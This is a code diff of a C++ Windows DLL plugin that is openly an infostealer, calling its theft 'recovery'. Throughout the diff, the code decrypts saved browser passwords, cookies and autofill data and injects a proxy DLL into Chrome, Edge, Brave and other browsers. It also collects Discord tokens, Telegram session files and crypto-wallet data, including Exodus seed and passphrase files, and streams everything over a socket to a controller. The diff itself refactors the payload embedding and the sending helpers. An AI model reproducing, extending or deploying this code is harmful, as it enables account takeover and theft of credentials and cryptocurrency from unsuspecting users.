@@ -2,7 +2,6 @@
 #include <winsock2.h>
 #include <windows.h>
 #include <tlhelp32.h>
-#include <iostream>
 #include <vector>
 #include <string>
 #include <map>
@@ -29,11 +28,11 @@
 #pragma comment(lib, "crypt32.lib")
 #pragma comment(lib, "bcrypt.lib")
 #pragma comment(lib, "shlwapi.lib")
+#pragma comment(lib, "ole32.lib")
 
 using json = nlohmann::json;
 namespace fs = std::filesystem;
 
-// Protocol constants
 #define PACKET_SIGNATURE          0x524E
 #define PACKET_TYPE_RECOVERY_FILE 0x07
 
@@ -45,73 +44,49 @@ struct PacketHeader {
 };
 #pragma pack(pop)
 
-// --- BURAYA BASE64 ENCODED DLL VERİSİNİ YAPIŞTIRIN (proxydll.dll) ---
-static const std::string EMBEDDED_DLL_BASE64 = "";
+#include "proxydll_payload.h"
 
-static const std::string base64_chars =
-    "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
-    "abcdefghijklmnopqrstuvwxyz"
-    "0123456789+/";
-
-std::vector<unsigned char> base64_decode(std::string const& encoded_string) {
-    int in_len = (int)encoded_string.size();
-    int i = 0, j = 0, in_ = 0;
-    unsigned char char_array_4[4], char_array_3[3];
-    std::vector<unsigned char> ret;
-    while (in_len-- && (encoded_string[in_] != '=') && (isalnum(encoded_string[in_]) || (encoded_string[in_] == '+') || (encoded_string[in_] == '/'))) {
-        char_array_4[i++] = encoded_string[in_]; in_++;
-        if (i == 4) {
-            for (i = 0; i < 4; i++) char_array_4[i] = (unsigned char)base64_chars.find(char_array_4[i]);
-            char_array_3[0] = (char_array_4[0] << 2) + ((char_array_4[1] & 0x30) >> 4);
-            char_array_3[1] = ((char_array_4[1] & 0xf) << 4) + ((char_array_4[2] & 0x3c) >> 2);
-            char_array_3[2] = ((char_array_4[2] & 0x3) << 6) + char_array_4[3];
-            for (i = 0; (i < 3); i++) ret.push_back(char_array_3[i]);
-            i = 0;
-        }
-    }
-    if (i) {
-        for (j = i; j < 4; j++) char_array_4[j] = 0;
-        for (j = 0; j < 4; j++) char_array_4[j] = (unsigned char)base64_chars.find(char_array_4[j]);
-        char_array_3[0] = (char_array_4[0] << 2) + ((char_array_4[1] & 0x30) >> 4);
-        char_array_3[1] = ((char_array_4[1] & 0xf) << 4) + ((char_array_4[2] & 0x3c) >> 2);
-        char_array_3[2] = ((char_array_4[2] & 0x3) << 6) + char_array_4[3];
-        for (j = 0; (j < i - 1); j++) ret.push_back(char_array_3[j]);
-    }
-    return ret;
+static std::vector<unsigned char> read_file_binary(const fs::path& p) {
+    std::ifstream f(p, std::ios::binary | std::ios::ate);
+    if (!f) return {};
+    auto size = f.tellg();
+    if (size <= 0) return {};
+    std::vector<unsigned char> buffer((size_t)size);
+    f.seekg(0, std::ios::beg);
+    f.read((char*)buffer.data(), size);
+    return buffer;
 }
 
-// --- Helper for sending recovery files ---
+static bool send_all(SOCKET sock, const char* buf, int len) {
+    int total = 0;
+    while (total < len) {
+        int sent = send(sock, buf + total, len - total, 0);
+        if (sent <= 0) return false;
+        total += sent;
+    }
+    return true;
+}
+
 static bool send_recovery_file(SOCKET sock, const std::string& relPath, const std::vector<unsigned char>& data) {
     uint32_t pathLen = (uint32_t)relPath.size();
     uint32_t offset = 0;
     uint32_t payloadSize = 4 + pathLen + 4 + (uint32_t)data.size();
 
-    std::vector<unsigned char> packet;
-    packet.resize(sizeof(PacketHeader) + payloadSize);
+    PacketHeader header;
+    header.signature = PACKET_SIGNATURE;
+    header.type = PACKET_TYPE_RECOVERY_FILE;
+    header.size = payloadSize;
 
-    PacketHeader* header = (PacketHeader*)packet.data();
-    header->signature = PACKET_SIGNATURE;
-    header->type = PACKET_TYPE_RECOVERY_FILE;
-    header->size = payloadSize;
-
-    unsigned char* p = packet.data() + sizeof(PacketHeader);
-    memcpy(p, &pathLen, 4); p += 4;
-    memcpy(p, relPath.c_str(), pathLen); p += pathLen;
-    memcpy(p, &offset, 4); p += 4;
-    if (!data.empty()) memcpy(p, data.data(), data.size());
-
-    int totalSent = 0;
-    int len = (int)packet.size();
-    while (totalSent < len) {
-        int sent = send(sock, (const char*)packet.data() + totalSent, len - totalSent, 0);
-        if (sent == SOCKET_ERROR) return false;
-        totalSent += sent;
-    }
+    if (!send_all(sock, (const char*)&header, sizeof(header))) return false;
+    if (!send_all(sock, (const char*)&pathLen, 4)) return false;
+    if (!send_all(sock, relPath.c_str(), (int)pathLen)) return false;
+    if (!send_all(sock, (const char*)&offset, 4)) return false;
+    if (!data.empty() && !send_all(sock, (const char*)data.data(), (int)data.size())) return false;
     return true;
 }
 
 static bool send_recovery_json(SOCKET sock, const std::string& relPath, const json& j) {
-    std::string s = j.dump(4, ' ', false, nlohmann::json::error_handler_t::replace);
+    std::string s = j.dump(-1, ' ', false, nlohmann::json::error_handler_t::replace);
     std::vector<unsigned char> data(s.begin(), s.end());
     return send_recovery_file(sock, relPath, data);
 }
@@ -121,7 +96,6 @@ static bool send_recovery_text(SOCKET sock, const std::string& relPath, const st
     return send_recovery_file(sock, relPath, data);
 }
 
-// --- Recovery Logic ---
 struct PasswordData { std::string url, username, password; };
 struct CookieData {
     std::string host, name, value, path;
@@ -138,7 +112,7 @@ struct ProfileData {
     std::vector<AutofillData> autofill;
 };
 
-std::string sanitize_internal(const unsigned char* data, size_t size) {
+static std::string sanitize_internal(const unsigned char* data, size_t size) {
     std::string output; output.reserve(size);
     for (size_t i = 0; i < size; ++i) {
         unsigned char c = data[i];
@@ -148,10 +122,10 @@ std::string sanitize_internal(const unsigned char* data, size_t size) {
     return output;
 }
 
-std::string to_utf8_lossy(const std::vector<unsigned char>& input) { return sanitize_internal(input.data(), input.size()); }
-std::string ensure_utf8(const std::string& input) { return sanitize_internal((const unsigned char*)input.data(), input.size()); }
+static std::string to_utf8_lossy(const std::vector<unsigned char>& input) { return sanitize_internal(input.data(), input.size()); }
+static std::string ensure_utf8(const std::string& input) { return sanitize_internal((const unsigned char*)input.data(), input.size()); }
 
-std::vector<unsigned char> strip_signature(const std::vector<unsigned char>& data, bool force = false) {
+static std::vector<unsigned char> strip_signature(const std::vector<unsigned char>& data, bool force = false) {
     if (data.size() < 32) return data;
     if (force) return std::vector<unsigned char>(data.begin() + 32, data.end());
     int non_printable = 0; bool has_control = false;
@@ -164,7 +138,7 @@ std::vector<unsigned char> strip_signature(const std::vector<unsigned char>& dat
     return data;
 }
 
-std::vector<unsigned char> decrypt_dpapi(const std::vector<unsigned char>& data) {
+static std::vector<unsigned char> decrypt_dpapi(const std::vector<unsigned char>& data) {
     DATA_BLOB input = { (DWORD)data.size(), (BYTE*)data.data() };
     DATA_BLOB output = { 0, nullptr };
     if (CryptUnprotectData(&input, nullptr, nullptr, nullptr, nullptr, 0, &output)) {
@@ -174,7 +148,7 @@ std::vector<unsigned char> decrypt_dpapi(const std::vector<unsigned char>& data)
     return {};
 }
 
-std::vector<unsigned char> aes_gcm_decrypt(const std::vector<unsigned char>& key, const std::vector<unsigned char>& data) {
+static std::vector<unsigned char> aes_gcm_decrypt(const std::vector<unsigned char>& key, const std::vector<unsigned char>& data) {
     if (data.size() < 15) return {};
     BCRYPT_ALG_HANDLE h_alg = nullptr; BCRYPT_KEY_HANDLE h_key = nullptr;
     BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO info; memset(&info, 0, sizeof(info));
@@ -194,7 +168,7 @@ std::vector<unsigned char> aes_gcm_decrypt(const std::vector<unsigned char>& key
     plaintext.resize(cb_plain); return plaintext;
 }
 
-std::vector<unsigned char> decrypt_blob(const std::vector<unsigned char>& blob, const std::vector<unsigned char>& v10_key, const std::vector<unsigned char>& v20_key) {
+static std::vector<unsigned char> decrypt_blob(const std::vector<unsigned char>& blob, const std::vector<unsigned char>& v10_key, const std::vector<unsigned char>& v20_key) {
     if (blob.empty()) return {};
     std::vector<unsigned char> dec; bool is_v20 = false;
     if (blob.size() > 3 && std::string((char*)blob.data(), 3) == "v20") {
@@ -206,14 +180,14 @@ std::vector<unsigned char> decrypt_blob(const std::vector<unsigned char>& blob, 
     return dec;
 }
 
-std::string wstring_to_utf8(const std::wstring& wstr) {
+static std::string wstring_to_utf8(const std::wstring& wstr) {
     if (wstr.empty()) return "";
     int size = WideCharToMultiByte(CP_UTF8, 0, &wstr[0], (int)wstr.size(), NULL, 0, NULL, NULL);
     std::string str(size, 0); WideCharToMultiByte(CP_UTF8, 0, &wstr[0], (int)wstr.size(), &str[0], size, NULL, NULL);
     return str;
 }
 
-bool copy_file_locked(const fs::path& source, const fs::path& dest) {
+static bool copy_file_locked(const fs::path& source, const fs::path& dest) {
     if (!fs::exists(source)) return false;
     for (int i = 0; i < 3; i++) {
         HANDLE h_src = CreateFileW(source.c_str(), GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, nullptr, OPEN_EXISTING, 0, nullptr);
@@ -230,7 +204,7 @@ bool copy_file_locked(const fs::path& source, const fs::path& dest) {
     return false;
 }
 
-bool copy_db_with_sidecars(const fs::path& source_db, const fs::path& dest_db) {
+static bool copy_db_with_sidecars(const fs::path& source_db, const fs::path& dest_db) {
     if (!copy_file_locked(source_db, dest_db)) return false;
     std::wstring src = source_db.wstring(), dst = dest_db.wstring();
     if (fs::exists(src + L"-wal")) copy_file_locked(src + L"-wal", dst + L"-wal");
@@ -239,15 +213,15 @@ bool copy_db_with_sidecars(const fs::path& source_db, const fs::path& dest_db) {
     return true;
 }
 
-int open_db_for_extraction(const std::string& path, sqlite3** db) {
-    int rc = sqlite3_open_v2(path.c_str(), db, SQLITE_OPEN_READWRITE | SQLITE_OPEN_CREATE | SQLITE_OPEN_NOMUTEX, nullptr);
+static int open_db_for_extraction(const std::string& path, sqlite3** db) {
+    int rc = sqlite3_open_v2(path.c_str(), db, SQLITE_OPEN_READONLY | SQLITE_OPEN_NOMUTEX, nullptr);
     if (rc == SQLITE_OK) sqlite3_exec(*db, "PRAGMA wal_checkpoint(TRUNCATE);", nullptr, nullptr, nullptr);
     return rc;
 }
 
-void cleanup_db_temp(const fs::path& db_path) {
+static void cleanup_db_temp(const fs::path& db_path) {
     std::error_code ec; fs::remove(db_path, ec);
-    fs::remove(db_path.string() + "-wal", ec); fs::remove(db_path.string() + "-shm", ec); fs::remove(db_path.string() + "-journal", ec);
+    fs::remove(db_path.wstring() + L"-wal", ec); fs::remove(db_path.wstring() + L"-shm", ec); fs::remove(db_path.wstring() + L"-journal", ec);
 }
 
 struct BrowserConfig {
@@ -257,9 +231,9 @@ struct BrowserConfig {
     int csidl_folder;
 };
 
-const std::vector<BrowserConfig> BROWSERS = {
+static const std::vector<BrowserConfig> BROWSERS = {
     {L"Chrome", L"chrome.exe", L"Google\\Chrome\\User Data", {L"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe", L"C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe"}, true, false, CSIDL_LOCAL_APPDATA},
-    {L"Edge", L"msedge.exe", L"Microsoft\\Edge\\User Data", {L"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe", L"C:\\Program Files\\Microsoft\\Edge\\Application\\msedge.exe"}, true, false, CSIDL_LOCAL_APPDATA},
+    {L"Edge", L"msedge.exe", L"Microsoft\\Edge\\User Data", {L"C:\\Program Files\\Microsoft\\Edge\\Application\\msedge.exe", L"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe"}, true, false, CSIDL_LOCAL_APPDATA},
     {L"Brave", L"brave.exe", L"BraveSoftware\\Brave-Browser\\User Data", {L"C:\\Program Files\\BraveSoftware\\Brave-Browser\\Application\\brave.exe", L"C:\\Program Files (x86)\\BraveSoftware\\Brave-Browser\\Application\\brave.exe"}, true, false, CSIDL_LOCAL_APPDATA},
     {L"Opera", L"launcher.exe", L"Opera Software\\Opera Stable", {L"C:\\Program Files\\Opera\\launcher.exe"}, false, false, CSIDL_APPDATA},
     {L"Opera GX", L"launcher.exe", L"Opera Software\\Opera GX Stable", {L"C:\\Program Files\\Opera GX\\launcher.exe"}, false, false, CSIDL_APPDATA},
@@ -271,7 +245,7 @@ const std::vector<BrowserConfig> BROWSERS = {
     {L"Vivaldi", L"vivaldi.exe", L"Vivaldi\\User Data", {L"C:\\Program Files\\Vivaldi\\Application\\vivaldi.exe", L"C:\\Program Files (x86)\\Vivaldi\\Application\\vivaldi.exe"}, true, false, CSIDL_LOCAL_APPDATA}
 };
 
-std::wstring find_browser_exe(const std::wstring& name) {
+static std::wstring find_browser_exe(const std::wstring& name) {
     for (const auto& b : BROWSERS) {
         if (b.name == name) {
             for (const auto& p : b.common_paths) if (fs::exists(p)) return p;
@@ -316,7 +290,7 @@ std::wstring find_browser_exe(const std::wstring& name) {
     return L"";
 }
 
-DWORD find_main_process(const std::wstring& exe_name) {
+static DWORD find_main_process(const std::wstring& exe_name) {
     HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); if (snapshot == INVALID_HANDLE_VALUE) return 0;
     PROCESSENTRY32W entry; entry.dwSize = sizeof(entry); std::vector<DWORD> pids;
     if (Process32FirstW(snapshot, &entry)) {
@@ -331,7 +305,8 @@ DWORD find_main_process(const std::wstring& exe_name) {
     CloseHandle(snapshot); return main_pid;
 }
 
-void inject_dll_reflective(HANDLE h_process, const std::vector<unsigned char>& dll_bytes) {
+static void inject_dll_reflective(HANDLE h_process, const std::vector<unsigned char>& dll_bytes) {
+    if (dll_bytes.empty()) return;
     IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)dll_bytes.data();
     IMAGE_NT_HEADERS64* nt = (IMAGE_NT_HEADERS64*)(dll_bytes.data() + dos->e_lfanew);
     void* remote_base = VirtualAllocEx(h_process, (void*)nt->OptionalHeader.ImageBase, nt->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
@@ -353,13 +328,13 @@ void inject_dll_reflective(HANDLE h_process, const std::vector<unsigned char>& d
     if (thread) { WaitForSingleObject(thread, INFINITE); CloseHandle(thread); }
 }
 
-std::string get_sqlite_text(sqlite3_stmt* stmt, int col) { const unsigned char* txt = sqlite3_column_text(stmt, col); return txt ? std::string((const char*)txt) : ""; }
+static std::string get_sqlite_text(sqlite3_stmt* stmt, int col) { const unsigned char* txt = sqlite3_column_text(stmt, col); return txt ? std::string((const char*)txt) : ""; }
 
 typedef enum { SECSuccess = 0, SECFailure = -1 } SECStatus;
 struct SECItem { int type; unsigned char* data; unsigned int len; };
 typedef SECStatus(*NSSInit_t)(const char*); typedef SECStatus(*NSSShutdown_t)(void); typedef SECStatus(*PK11SDRDecrypt_t)(SECItem*, SECItem*, void*);
 
-void collect_firefox(SOCKET sock, const BrowserConfig& browser) {
+static void collect_firefox(SOCKET sock, const BrowserConfig& browser) {
     wchar_t sz_path[MAX_PATH]; if (SHGetFolderPathW(NULL, browser.csidl_folder, NULL, 0, sz_path) != S_OK) return;
     fs::path data_path = fs::path(sz_path) / browser.data_path_relative; if (!fs::exists(data_path)) return;
     std::vector<fs::path> profile_paths; fs::path ini_path = data_path / "profiles.ini"; std::error_code ec;
@@ -491,7 +466,7 @@ void collect_firefox(SOCKET sock, const BrowserConfig& browser) {
     fs::remove_all(temp_dir, ec);
 }
 
-void inject_and_collect(SOCKET sock, const std::vector<unsigned char>& dll, const BrowserConfig& browser) {
+static void inject_and_collect(SOCKET sock, const std::vector<unsigned char>& dll, const BrowserConfig& browser) {
     wchar_t sz[MAX_PATH]; if (SHGetFolderPathW(NULL, browser.csidl_folder, NULL, 0, sz) != S_OK) return;
     fs::path data = fs::path(sz) / browser.data_path_relative; if (!fs::exists(data)) return;
     bool is_yandex = (browser.name == L"Yandex");
@@ -524,7 +499,7 @@ void inject_and_collect(SOCKET sock, const std::vector<unsigned char>& dll, cons
         }
     }
     HANDLE h_pipe = INVALID_HANDLE_VALUE;
-    if (browser.use_injection) { h_pipe = CreateNamedPipeW(L"\\\\.\\pipe\\chrome_extractor", PIPE_ACCESS_INBOUND | FILE_FLAG_OVERLAPPED, PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT, 1, 50 * 1024 * 1024, 50 * 1024 * 1024, 0, NULL); if (!dll.empty()) inject_dll_reflective(h_proc, dll); if (started) { ResumeThread(pi.hThread); Sleep(500); } }
+    if (browser.use_injection) { h_pipe = CreateNamedPipeW(L"\\\\.\\pipe\\chrome_extractor", PIPE_ACCESS_INBOUND | FILE_FLAG_OVERLAPPED, PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT, 1, 50 * 1024 * 1024, 50 * 1024 * 1024, 0, NULL); if (!dll.empty()) inject_dll_reflective(h_proc, dll); if (started) { ResumeThread(pi.hThread); Sleep(500); } }
     std::vector<unsigned char> v10, v20;
     try {
         std::ifstream f(data / "Local State");
@@ -585,7 +560,7 @@ void inject_and_collect(SOCKET sock, const std::vector<unsigned char>& dll, cons
                 std::stringstream ss_c; json j_c = json::array(); for (auto& i : p_data.cookies) {
                     ss_c << "Host: " << i.host << " | Name: " << i.name << " | Value: " << i.value << "\n";
                     json cj; std::string hr = i.host; if (hr.find("http") != 0) hr = "https://" + (hr[0] == '.' ? hr.substr(1) : hr); if (hr.back() != '/') hr += "/";
-                    cj["Host raw"] = ensure_utf8(hr); cj["Name raw"] = ensure_utf8(i.name); cj["Path raw"] = ensure_utf8(i.path); cj["Content raw"] = ensure_utf8(i.value);
+                    cj["Host raw"] = ensure_utf8(hr); cj["Name raw"] = ensure_utf8(i.name); cj["Path raw"] = ensure_utf8(c.path); cj["Content raw"] = ensure_utf8(i.value);
                     long long ut = (i.expires_utc / 1000000) - 11644473600LL; std::time_t t = (std::time_t)ut; struct tm *tmp = std::gmtime(&t); char dbuf[64]; if (tmp && std::strftime(dbuf, sizeof(dbuf), "%d-%m-%Y %H:%M:%S", tmp)) cj["Expires"] = std::string(dbuf);
                     cj["Expires raw"] = std::to_string(ut); cj["Send for"] = i.is_secure ? "Encrypted connections only" : "Any type of connection"; cj["Send for raw"] = i.is_secure ? "true" : "false"; cj["HTTP only raw"] = i.is_httponly ? "true" : "false"; cj["SameSite raw"] = "no_restriction"; cj["This domain only"] = (i.host[0] == '.') ? "false" : "true"; j_c.push_back(cj);
                 }
@@ -607,9 +582,9 @@ void inject_and_collect(SOCKET sock, const std::vector<unsigned char>& dll, cons
 }
 
 struct DiscordConfig { std::wstring name, folder_name; };
-const std::vector<DiscordConfig> DISCORDS = { {L"Discord", L"discord"}, {L"Discord Canary", L"discordcanary"}, {L"Discord PTB", L"discordptb"}, {L"Lightcord", L"Lightcord"} };
+static const std::vector<DiscordConfig> DISCORDS = { {L"Discord", L"discord"}, {L"Discord Canary", L"discordcanary"}, {L"Discord PTB", L"discordptb"}, {L"Lightcord", L"Lightcord"} };
 
-void collect_discord(SOCKET sock, const DiscordConfig& cfg) {
+static void collect_discord(SOCKET sock, const DiscordConfig& cfg) {
     wchar_t sz[MAX_PATH]; if (SHGetFolderPathW(NULL, CSIDL_APPDATA, NULL, 0, sz) != S_OK) return;
     fs::path data = fs::path(sz) / cfg.folder_name; if (!fs::exists(data)) return;
     std::vector<unsigned char> key;
@@ -647,7 +622,7 @@ void collect_discord(SOCKET sock, const DiscordConfig& cfg) {
     }
 }
 
-void collect_telegram(SOCKET sock) {
+static void collect_telegram(SOCKET sock) {
     std::vector<fs::path> paths; wchar_t sz[MAX_PATH];
     if (SHGetFolderPathW(NULL, CSIDL_APPDATA, NULL, 0, sz) == S_OK) paths.push_back(fs::path(sz) / L"Telegram Desktop\\tdata");
     if (SHGetFolderPathW(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, sz) == S_OK) paths.push_back(fs::path(sz) / L"Telegram Desktop\\tdata");
@@ -659,20 +634,14 @@ void collect_telegram(SOCKET sock) {
                 if (fn.length() == 16 && std::all_of(fn.begin(), fn.end(), [](char c){ return std::isxdigit(c); })) {
                     for (const auto& sub : fs::directory_iterator(entry.path(), ec)) {
                         if (sub.is_regular_file()) {
-                            std::ifstream f(sub.path(), std::ios::binary);
-                            if (f.is_open()) {
-                                std::vector<unsigned char> data((std::istreambuf_iterator<char>(f)), std::istreambuf_iterator<char>());
-                                send_recovery_file(sock, "Telegram/tdata/" + fn + "/" + sub.path().filename().string(), data);
-                            }
+                            auto data = read_file_binary(sub.path());
+                            if (!data.empty()) send_recovery_file(sock, "Telegram/tdata/" + fn + "/" + sub.path().filename().string(), data);
                         }
                     }
                 }
                 else if (fn == "key_datas" || fn == "settingss" || fn == "maps" || fn == "config") {
-                    std::ifstream f(entry.path(), std::ios::binary);
-                    if (f.is_open()) {
-                        std::vector<unsigned char> data((std::istreambuf_iterator<char>(f)), std::istreambuf_iterator<char>());
-                        send_recovery_file(sock, "Telegram/tdata/" + fn, data);
-                    }
+                    auto data = read_file_binary(entry.path());
+                    if (!data.empty()) send_recovery_file(sock, "Telegram/tdata/" + fn, data);
                 }
             }
             break;
@@ -701,7 +670,7 @@ static const std::vector<WalletConfig> WALLETS = {
     {"Zerion",        {"klghhnkeealcohjjanjjdaeeggmfmlpl",  ""}},
 };
 
-void send_extension_storage(SOCKET sock, const fs::path& src_dir, const std::string& rel_base) {
+static void send_extension_storage(SOCKET sock, const fs::path& src_dir, const std::string& rel_base) {
     if (!fs::exists(src_dir)) return;
     std::error_code ec;
     try {
@@ -710,17 +679,14 @@ void send_extension_storage(SOCKET sock, const fs::path& src_dir, const std::str
             std::string ext = entry.path().extension().string();
             std::string fname = entry.path().filename().string();
             if (ext == ".ldb" || ext == ".log" || ext == ".sst" || fname == "MANIFEST" || fname == "CURRENT" || fname == "LOCK") {
-                std::ifstream f(entry.path(), std::ios::binary);
-                if (f.is_open()) {
-                    std::vector<unsigned char> data((std::istreambuf_iterator<char>(f)), std::istreambuf_iterator<char>());
-                    send_recovery_file(sock, rel_base + "/" + fname, data);
-                }
+                auto data = read_file_binary(entry.path());
+                if (!data.empty()) send_recovery_file(sock, rel_base + "/" + fname, data);
             }
         }
     } catch (...) {}
 }
 
-std::string get_firefox_extension_uuid(const fs::path& prof_path, const std::string& ext_id) {
+static std::string get_firefox_extension_uuid(const fs::path& prof_path, const std::string& ext_id) {
     fs::path prefs_path = prof_path / "prefs.js";
     if (!fs::exists(prefs_path)) return "";
     try {
@@ -743,7 +709,7 @@ std::string get_firefox_extension_uuid(const fs::path& prof_path, const std::str
     return "";
 }
 
-void collect_wallets(SOCKET sock) {
+static void collect_wallets(SOCKET sock) {
     for (const auto& browser : BROWSERS) {
         if (browser.is_firefox_based) {
             wchar_t sz[MAX_PATH]; if (SHGetFolderPathW(NULL, browser.csidl_folder, NULL, 0, sz) != S_OK) continue;
@@ -766,12 +732,12 @@ void collect_wallets(SOCKET sock) {
                         if (!uuid.empty()) {
                             fs::path idb = storage_base / ("moz-extension+++" + uuid) / "idb";
                             if (fs::exists(idb)) {
-                                std::error_code ec; for (const auto& f : fs::directory_iterator(idb, ec)) { if (f.path().extension() == ".sqlite" || f.path().extension() == ".files") { std::ifstream ifs(f.path(), std::ios::binary); if (ifs.is_open()) { std::vector<unsigned char> d((std::istreambuf_iterator<char>(ifs)), std::istreambuf_iterator<char>()); send_recovery_file(sock, "wallets/" + wallet.name + "/" + b_name + "/" + prof_name + "/" + f.path().filename().string(), d); } } }
+                                std::error_code ec; for (const auto& f : fs::directory_iterator(idb, ec)) { if (f.path().extension() == ".sqlite" || f.path().extension() == ".files") { auto d = read_file_binary(f.path()); if (!d.empty()) send_recovery_file(sock, "wallets/" + wallet.name + "/" + b_name + "/" + prof_name + "/" + f.path().filename().string(), d); } }
                             }
                         }
                     }
                     fs::path les_ff = prof_path / "browser-extension-data" / wallet.extension_ids[1];
-                    if (fs::exists(les_ff)) { std::error_code ec; for (const auto& f : fs::directory_iterator(les_ff, ec)) { if (f.is_regular_file(ec)) { std::ifstream ifs(f.path(), std::ios::binary); if (ifs.is_open()) { std::vector<unsigned char> d((std::istreambuf_iterator<char>(ifs)), std::istreambuf_iterator<char>()); send_recovery_file(sock, "wallets/" + wallet.name + "/" + b_name + "/" + prof_name + "/" + f.path().filename().string(), d); } } } }
+                    if (fs::exists(les_ff)) { std::error_code ec; for (const auto& f : fs::directory_iterator(les_ff, ec)) { if (f.is_regular_file(ec)) { auto d = read_file_binary(f.path()); if (!d.empty()) send_recovery_file(sock, "wallets/" + wallet.name + "/" + b_name + "/" + prof_name + "/" + f.path().filename().string(), d); } } }
                 }
             }
         } else {
@@ -791,21 +757,22 @@ void collect_wallets(SOCKET sock) {
         fs::path exodus_base = fs::path(appdata_buf) / L"Exodus";
         if (fs::exists(exodus_base)) {
             fs::path wallet_dir = exodus_base / "exodus.wallet";
-            if (fs::exists(wallet_dir)) { std::error_code ec; for (const auto& entry : fs::directory_iterator(wallet_dir, ec)) { if (!entry.is_regular_file(ec)) continue; std::string fext = entry.path().extension().string(); std::string fname = entry.path().filename().string(); if (fext == ".ldb" || fext == ".log" || fext == ".sst" || fext == ".json" || fext == ".seed" || fext == ".dat" || fname == "MANIFEST" || fname == "CURRENT" || fname == "LOCK") { std::ifstream f(entry.path(), std::ios::binary); if (f.is_open()) { std::vector<unsigned char> d((std::istreambuf_iterator<char>(f)), std::istreambuf_iterator<char>()); send_recovery_file(sock, "wallets/ExodusDesktop/exodus.wallet/" + fname, d); } } } }
+            if (fs::exists(wallet_dir)) { std::error_code ec; for (const auto& entry : fs::directory_iterator(wallet_dir, ec)) { if (!entry.is_regular_file(ec)) continue; std::string fext = entry.path().extension().string(); std::string fname = entry.path().filename().string(); if (fext == ".ldb" || fext == ".log" || fext == ".sst" || fext == ".json" || fext == ".seed" || fext == ".dat" || fname == "MANIFEST" || fname == "CURRENT" || fname == "LOCK") { auto d = read_file_binary(entry.path()); if (!d.empty()) send_recovery_file(sock, "wallets/ExodusDesktop/exodus.wallet/" + fname, d); } } }
             fs::path backups_dir = exodus_base / "backups";
-            if (fs::exists(backups_dir)) { std::error_code ec; for (const auto& entry : fs::directory_iterator(backups_dir, ec)) { if (!entry.is_regular_file(ec)) continue; std::ifstream f(entry.path(), std::ios::binary); if (f.is_open()) { std::vector<unsigned char> d((std::istreambuf_iterator<char>(f)), std::istreambuf_iterator<char>()); send_recovery_file(sock, "wallets/ExodusDesktop/backups/" + entry.path().filename().string(), d); } } }
+            if (fs::exists(backups_dir)) { std::error_code ec; for (const auto& entry : fs::directory_iterator(backups_dir, ec)) { if (!entry.is_regular_file(ec)) continue; auto d = read_file_binary(entry.path()); if (!d.empty()) send_recovery_file(sock, "wallets/ExodusDesktop/backups/" + entry.path().filename().string(), d); } }
             static const std::vector<std::wstring> EXODUS_ROOT_FILES = { L"passphrase.json", L"seed.seco", L"info.json" };
-            for (const auto& fn : EXODUS_ROOT_FILES) { fs::path fp = exodus_base / fn; if (fs::exists(fp)) { std::ifstream f(fp, std::ios::binary); if (f.is_open()) { std::vector<unsigned char> d((std::istreambuf_iterator<char>(f)), std::istreambuf_iterator<char>()); send_recovery_file(sock, "wallets/ExodusDesktop/config/" + fs::path(fn).filename().string(), d); } } }
+            for (const auto& fn : EXODUS_ROOT_FILES) { fs::path fp = exodus_base / fn; if (fs::exists(fp)) { auto d = read_file_binary(fp); if (!d.empty()) send_recovery_file(sock, "wallets/ExodusDesktop/config/" + fs::path(fn).filename().string(), d); } }
         }
     }
 }
 
 extern "C" __declspec(dllexport) void RunPlugin(SOCKET sock) {
     std::vector<unsigned char> dll;
-    try {
-        if (!EMBEDDED_DLL_BASE64.empty()) { dll = base64_decode(EMBEDDED_DLL_BASE64); }
-        else { std::ifstream f("proxydll.dll", std::ios::binary); if (f.is_open()) { dll = std::vector<unsigned char>((std::istreambuf_iterator<char>(f)), std::istreambuf_iterator<char>()); } }
-    } catch (...) {}
+    if (sizeof(PAYLOAD_DLL_BYTES) > 1) {
+        dll.assign(PAYLOAD_DLL_BYTES, PAYLOAD_DLL_BYTES + sizeof(PAYLOAD_DLL_BYTES));
+    } else {
+        dll = read_file_binary("proxydll.dll");
+    }
 
     for (const auto& c : BROWSERS) {
         try { if (c.is_firefox_based) collect_firefox(sock, c); else inject_and_collect(sock, dll, c); } catch (...) {}
@@ -825,5 +792,8 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* com
 }
 
 BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
+    if (ul_reason_for_call == DLL_PROCESS_ATTACH) {
+        DisableThreadLibraryCalls(hModule);
+    }
     return TRUE;
 }
